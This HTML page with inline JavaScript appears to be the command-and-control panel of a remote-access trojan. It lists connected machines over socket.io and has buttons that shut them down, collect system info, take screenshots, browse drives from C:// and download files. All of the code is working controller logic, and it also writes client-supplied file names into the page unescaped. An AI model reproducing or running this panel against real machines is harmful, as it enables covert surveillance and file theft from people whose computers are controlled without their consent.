<head></head>
<body>
  <div id="list">

  </div>
  <div id="tree"></div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.2/socket.io.js"></script>
  <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
  <script>
    const socket = io.connect('127.0.0.1:3000');

    socket.on('client:connect', function(c) {
      const template = `
        <div id="${c}" class="item">
          <label class="sid">${c}</label>
          <label class="uid"></label>
          <label class="cmd"></label>
          <button onclick="sayhi(${c})">say hi</button>
          <button onclick="sendoff(${c})">turn off</button>
          <button onclick="systeminfo(${c})">system info</button>
          <button onclick="screenshot(${c})">screenshot</button>
          <button onclick="ls(${c}, 'C://')">ls</button>
        </div>
        `;
      $('#list').append($(template));
    });

    socket.on('client:disconect', function(c) {
      $('#list div#' + c).remove();
      $('#tree').empty();
    });

    socket.on('client:update', function(obj) {
      const $el = $('div#' + obj.sid);
      $el.find('.uid').html(obj.uid);
      $('#tree').html(obj.msg);

      try {
        const ans = JSON.parse(obj.msg);
        if (ans.ls) {
          fileTree(obj.sid, ans.ls);
        }
      } catch(e) {
        console.info('error', e);
      }
    });

    let currPath;
    function sendoff(cl) {
      console.log('sendoff', cl);
      socket.emit('client:send', {sid: cl, cmd: 'off'});
    }

    function sayhi(cl) {
      console.log('sayhi', cl);
      socket.emit('client:send', {sid: cl, cmd: 'hi'});
    }

    function systeminfo(cl) {
      console.log('system info', cl);
      socket.emit('client:send', {sid: cl, cmd: 'systeminfo'});
    }

    function screenshot(cl) {
      console.log('screenshot', cl);
      socket.emit('client:send', {sid: cl, cmd: 'screenshot', args: 'screenshot.bmp'});
    }

    function download(cl, name, path) {
      console.log('download', cl);
      socket.emit('client:send', {sid: cl, cmd: 'dw', args: {name: name, path: path.replace(' ', '\ ')}});
    }

    function ls(cl, path) {
      currPath = path.indexOf('..') != -1  ? 'C://' : path;
      console.log('ls', cl, path);
      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath.replace(' ', '\ ')});
    }


    function fileTree(c, f) {
      const $tree = $('#tree');
      $tree.empty();
      $tree.data('client', c);
      for (var i in f) {
        const x = f[i].replace('./', '');
        const el = $('<div style="cursor:pointer" id="' + x + '">');
        el.html(f[i]);
        console.log(f[i][0]);
        if (f[i][0] == '.') el.on('click', () => ls(c, currPath + x + '/'));
        else el.on('click', () => download(c, x, currPath + x));

        $tree.append(el);
      }
    }
  </script>
</body>
